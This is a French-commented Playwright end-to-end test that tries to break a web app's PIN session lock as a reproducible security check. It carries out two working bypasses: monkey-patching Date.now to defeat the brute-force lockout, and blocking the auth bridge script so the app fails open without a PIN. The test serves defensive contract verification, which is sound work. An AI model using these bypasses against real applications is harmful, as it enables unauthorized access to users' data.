// tests/e2e/attack-p3-session.mjs — CONTRARIANT du Point 3
// (docs/next/AUTH_SESSION_CONTRACT.md) : tente de CASSER le verrou de session
// (src/auth/session.js + local-backend.js §2/§3). Repro EXÉCUTABLE, pas un
// raisonnement.
//
// Le contrat affirme explicitement (§2, dernière phrase) :
//   « Aucun chemin ne contourne le blocage. »
// et (§1) :
//   « … pour être testable et NON CONTOURNABLE EN CHANGEANT L'HORLOGE. »
//
// Ce script démontre DEUX chemins qui contournent le blocage :
//
//   ATTAQUE 1 — horloge : `local-backend.js#attemptUnlock` appelle
//   `Date.now()` (l'horloge GLOBALE et mutable de la page), pas une horloge
//   de confiance. `src/auth/session.js` est bien correct de façon ISOLÉE
//   (Math.max empêche `lockedUntil` de reculer si on rappelle le module avec
//   un `now` plus petit) — mais le pont navigateur, lui, fait confiance à
//   `Date.now()` tel quel. Quiconque exécute une ligne de JS dans la page
//   (console DevTools, bookmarklet, extension) peut monkey-patcher
//   `Date.now` pour avancer artificiellement l'horloge AVANT chaque
//   tentative et ainsi annuler complètement le blocage exponentiel anti-
//   force-brute, sans jamais avoir à attendre le vrai délai — brute-force
//   illimité sur le PIN, à la vitesse de dérivation PBKDF2.
//
//   ATTAQUE 2 — fail-open réseau : `ensureSessionReady()` attend
//   `window.PiloteoAuth` au plus 3000ms puis, s'il n'a pas chargé, bascule la
//   session en `status:"active"` et ouvre le portillon `/api` — MÊME SI UN
//   PIN EST DÉFINI. Bloquer une seule requête réseau (le fichier
//   `piloteo-auth-bridge.mjs`, via DevTools "Block request URL", un
//   throttling réseau, un proxy, une extension) suffit à faire disparaître
//   TOUT l'écran de verrouillage : aucun overlay, aucune saisie de PIN,
//   `/api/state` et `/api/me` répondent 200 immédiatement.
//
// Usage : node tests/e2e/attack-p3-session.mjs
//   PW_CHROMIUM=<chemin> pour piloter un binaire Chromium précis.

let _pw;
try { _pw = await import("playwright"); }
catch { _pw = await import("/opt/node22/lib/node_modules/playwright/index.js"); }
const chromium = _pw.chromium || _pw.default.chromium;

import { spawn } from "node:child_process";

const ROOT = new URL("../..", import.meta.url).pathname;
const PORT = 8197;
const BASE = `http://127.0.0.1:${PORT}`;

// Deux natures de vérification, à ne PAS confondre :
//  - `ok(cond, msg)`      : assertion de bonne santé du test lui-même (ex.
//    "le témoin fonctionne", "le PIN est resté défini"). `cond===true` est
//    la situation ATTENDUE ; si `cond===false` c'est le SCRIPT DE TEST qui a
//    un problème (pas une preuve de faille).
//  - `broken(cond, msg)`  : assertion d'ATTAQUE. `cond===true` signifie que
//    l'attaque a RÉUSSI, donc que le contrat est CASSÉ sur ce point — c'est
//    l'inverse d'un `assert` classique : on VEUT que cond soit fausse pour
//    dire "TENU". Les deux listes sont rapportées séparément dans le bilan
//    final pour ne jamais laisser une repro réussie s'afficher comme un ✓
//    anodin.
const failures = [];   // problèmes du harnais de test (pas des failles)
const brokenList = []; // failles RÉELLEMENT reproduites (contrat non tenu)
const ok = (cond, msg) => { if (cond) { console.log("  ✓", msg); } else { failures.push(msg); console.log("  ✗ (test):", msg); } };
const broken = (cond, msg) => { if (cond) { brokenList.push(msg); console.log("  💥 CASSÉ:", msg); } else { console.log("  ✓ (tenu):", msg); } };

const srv = spawn("python3", ["-m", "http.server", String(PORT), "--bind", "127.0.0.1"], {
  cwd: ROOT, stdio: ["ignore", "pipe", "pipe"],
});
srv.stderr.on("data", () => {});

async function waitServer() {
  for (let i = 0; i < 50; i++) {
    try { const r = await fetch(`${BASE}/index.html`); if (r.ok) return; } catch {}
    await new Promise((r) => setTimeout(r, 200));
  }
  throw new Error("serveur statique jamais up");
}

async function dismissWelcomeIfAny(page) {
  const welcome = page.locator("#piloteo-welcome");
  if (await welcome.isVisible().catch(() => false)) {
    await page.click("#piloteo-welcome button");
    await page.waitForFunction(() => !document.getElementById("piloteo-welcome"), { timeout: 3000 }).catch(() => {});
  }
}

process.on("unhandledRejection", (e) => { console.error("unhandledRejection:", e); });

let browser;
try {
  await waitServer();
  const exe = process.env.PW_CHROMIUM || chromium.executablePath();
  browser = await chromium.launch({ executablePath: exe, args: ["--no-sandbox"] });

  // =========================================================================
  // ATTAQUE 1 — brute-force illimité en avançant artificiellement `Date.now`
  // =========================================================================
  console.log("\n=== Attaque 1 : contournement anti-force-brute par manipulation d'horloge ===");
  {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    await page.goto(`${BASE}/index.html?solo=1`, { waitUntil: "networkidle" });
    await page.waitForSelector("#main-shell:not([hidden])", { timeout: 10000 });
    await dismissWelcomeIfAny(page);
    await page.waitForFunction(() => !!(window.PiloteoAuth && window.PiloteoLocal), { timeout: 5000 });

    const PIN = "97531";
    await page.evaluate((pin) => window.PiloteoLocal._authSetPin(pin, { lockOnOpen: true }), PIN);
    await page.reload({ waitUntil: "networkidle" });
    await page.waitForSelector("#piloteo-lock-pin", { timeout: 10000 });

    // Monkey-patch AVANT toute tentative : chaque lecture de Date.now() saute
    // artificiellement de 24h en avant, sans qu'aucune seconde réelle ne
    // s'écoule. Une seule ligne de JS dans la page — aucune connaissance du
    // schéma IndexedDB, aucun accès privilégié.
    await page.evaluate(() => {
      let counter = Date.now();
      Date.now = function () { counter += 24 * 60 * 60 * 1000; return counter; };
    });

    const t0 = Date.now();

    // 5 échecs -> déclenche le premier blocage exponentiel (2^0 = 1s selon la
    // vraie horloge). Avec l'horloge truquée qui avance de 24h à CHAQUE
    // appel, `canAttempt` ne verra JAMAIS `lockedUntil > now` : le blocage
    // n'a even pas le temps de s'appliquer.
    for (let i = 0; i < 5; i++) {
      const before = await page.evaluate(() => window.PiloteoLocal._authState().failedAttempts);
      await page.fill("#piloteo-lock-pin", "00000");
      await page.click("#piloteo-lock-submit");
      // Attendre que l'échec soit RÉELLEMENT enregistré (failedAttempts a
      // incrémenté) avant l'essai suivant, plutôt que sur un texte de
      // message qui peut rester inchangé (cf. refreshLockoutDisplay).
      await page.waitForFunction((n) => window.PiloteoLocal._authState().failedAttempts > n, before, { timeout: 5000 });
    }

    const stateAfter5 = await page.evaluate(() => window.PiloteoLocal._authState());
    ok(stateAfter5.failedAttempts >= 5, `5 échecs bien enregistrés (failedAttempts=${stateAfter5.failedAttempts})`);

    // Avec l'horloge réelle (comme le prouve tests/next/auth-session.test.mjs
    // et tests/e2e/auth-session.mjs) le 6e essai devrait être REFUSÉ
    // immédiatement (attente exponentielle). Ici, à cause du monkey-patch, le
    // 6e essai (avec le BON PIN, tenté dans la même seconde réelle) doit
    // pourtant réussir.
    await page.fill("#piloteo-lock-pin", PIN);
    await page.click("#piloteo-lock-submit");
    const unlocked = await page.waitForFunction(() => !document.getElementById("piloteo-lock"), { timeout: 3000 })
      .then(() => true).catch(() => false);

    const elapsedRealMs = Date.now() - t0; // horloge Node, pas celle (patchée) de la page

    broken(unlocked === true,
      `déverrouillage réussi juste après le 5e échec, en ${elapsedRealMs}ms réels (< 1000ms attendus par le blocage) — le blocage exponentiel est totalement contourné en avançant l'horloge de la page`);

    if (unlocked) {
      const finalState = await page.evaluate(() => window.PiloteoLocal._authState());
      ok(finalState.status === "active", `session active après le contournement (reçu ${JSON.stringify(finalState)})`);
      const stateResp = await page.evaluate(async () => { const r = await fetch("/api/state"); return r.status; });
      broken(stateResp === 200, "/api/state accessible après le contournement (impact : accès complet aux données)");
    }

    await ctx.close();
  }

  // =========================================================================
  // ATTAQUE 2 — fail-open : bloquer piloteo-auth-bridge.mjs élude le PIN
  // =========================================================================
  console.log("\n=== Attaque 2 : fail-open en empêchant PiloteoAuth de charger ===");
  {
    const ctx = await browser.newContext();
    const page = await ctx.newPage();
    // Désactive le cache HTTP du navigateur (CDP) : sans ça, un rechargement
    // après avoir posé `page.route(...).abort()` pourrait servir
    // `piloteo-auth-bridge.mjs` depuis le cache disque/mémoire (déjà chargé
    // lors de la navigation précédente dans ce même contexte) SANS repasser
    // par le réseau — ce qui masquerait artificiellement l'attaque. On force
    // donc un VRAI aller-retour réseau à chaque navigation.
    const cdp = await ctx.newCDPSession(page);
    await cdp.send("Network.setCacheDisabled", { cacheDisabled: true });

    // Étape 1 (préparation LÉGITIME, PiloteoAuth chargé normalement) : on
    // définit un PIN + lockOnOpen, comme le ferait un vrai utilisateur dans
    // Réglages.
    await page.goto(`${BASE}/index.html?solo=1`, { waitUntil: "networkidle" });
    await page.waitForSelector("#main-shell:not([hidden])", { timeout: 10000 });
    await dismissWelcomeIfAny(page);
    await page.waitForFunction(() => !!(window.PiloteoAuth && window.PiloteoLocal), { timeout: 5000 });
    const PIN = "24680";
    await page.evaluate((pin) => window.PiloteoLocal._authSetPin(pin, { lockOnOpen: true }), PIN);

    // Vérification témoin : SANS blocage réseau, un reload affiche bien
    // l'overlay (comme tests/e2e/auth-session.mjs cas 7) — la baseline
    // fonctionne, ce n'est pas un artefact de test.
    await page.reload({ waitUntil: "networkidle" });
    const overlayShownNormally = await page.locator("#piloteo-lock").count();
    ok(overlayShownNormally === 1, "témoin : sans blocage réseau, l'overlay de verrouillage s'affiche normalement");

    // Le mode solo enregistre un Service Worker hors-ligne (`sw-solo.js`) qui,
    // dès sa première activation (`clients.claim()`), sert TOUT asset statique
    // déjà récupéré une fois — y compris `piloteo-auth-bridge.mjs`, bien qu'il
    // ne soit PAS dans sa liste PRECACHE — depuis `caches` AVANT même de
    // regarder le réseau (« cache d'abord »). Le rechargement témoin ci-dessus
    // l'a donc déjà mis en cache de façon incidente, ce qui neutraliserait un
    // simple `page.route(...).abort()` sur un rechargement suivant (la requête
    // ne repasserait jamais par le réseau que Playwright intercepte). On vide
    // donc ce cache applicatif + on désenregistre le SW — l'équivalent EXACT
    // du bouton DevTools « Application > Clear storage » (case Cache Storage +
    // Service workers cochées, IndexedDB décochée : le PIN, lui, n'est PAS
    // effacé) — un geste standard, à la portée de n'importe qui, PAS une
    // fuite de recherche de faille.
    await page.evaluate(async () => {
      const regs = await navigator.serviceWorker.getRegistrations();
      await Promise.all(regs.map((r) => r.unregister()));
      const keys = await caches.keys();
      await Promise.all(keys.map((k) => caches.delete(k)));
    });
    const pinStillSet = await page.evaluate(() => window.PiloteoLocal._authState().hasPin);
    ok(pinStillSet === true, "le PIN reste bien défini dans IndexedDB après avoir vidé cache/SW (l'IndexedDB, elle, n'a pas été touchée)");

    // Étape 2 (L'ATTAQUE) : quelqu'un ayant un accès physique/navigateur au
    // poste VERROUILLÉ (le scénario même que ce PIN est censé défendre)
    // bloque UNE requête réseau — via DevTools "Block request URL", un
    // throttling agressif, un proxy, une extension — puis recharge la page.
    // Ici on simule ce blocage avec `page.route`, l'équivalent programmatique
    // exact de "Block request URL" dans DevTools.
    await page.route("**/piloteo-auth-bridge.mjs", (route) => route.abort());
    await page.reload({ waitUntil: "domcontentloaded" });

    // waitForPiloteoAuth(3000) : attendre le délai fail-open contractuel.
    await page.waitForTimeout(3500);

    const lockOverlayAfterBlock = await page.locator("#piloteo-lock").count();
    broken(lockOverlayAfterBlock === 0,
      "aucun overlay de verrouillage affiché malgré un PIN + lockOnOpen actifs, une fois piloteo-auth-bridge.mjs bloqué (fail-open)");

    const meResp = await page.evaluate(async () => {
      try { const r = await fetch("/api/me"); const d = await r.json(); return { status: r.status, hasUser: !!(d && d.user) }; }
      catch (e) { return { error: String(e) }; }
    });
    broken(meResp.status === 200 && meResp.hasUser,
      `/api/me répond 200 avec l'utilisateur SANS jamais avoir saisi le PIN (reçu ${JSON.stringify(meResp)}) — impact : accès complet aux données sans déverrouillage`);

    const stateResp = await page.evaluate(async () => {
      try { const r = await fetch("/api/state"); return r.status; } catch (e) { return "erreur:" + e; }
    });
    broken(stateResp === 200, `/api/state répond 200 sans déverrouillage (reçu ${stateResp})`);

    await ctx.close();
  }
} catch (e) {
  failures.push("exception: " + (e && e.message || e));
  console.error(e);
} finally {
  if (browser) await browser.close();
  srv.kill("SIGTERM");
}

console.log("\n--- Bilan ---");
if (failures.length) {
  console.log(`${failures.length} problème(s) dans le harnais de test lui-même (à corriger avant de tirer une conclusion) :`);
  failures.forEach((f) => console.log(" -", f));
}
if (brokenList.length) {
  console.log(`\nVERDICT : CASSÉ — ${brokenList.length} repro(s) ont contourné le blocage de session (contrat AUTH_SESSION_CONTRACT.md non tenu) :`);
  brokenList.forEach((f) => console.log(" - " + f));
  process.exit(1);
}
if (failures.length) process.exit(1);
console.log("VERDICT : TENU sur ces angles — aucune des attaques tentées n'a réussi à casser le lot.");
process.exit(0);
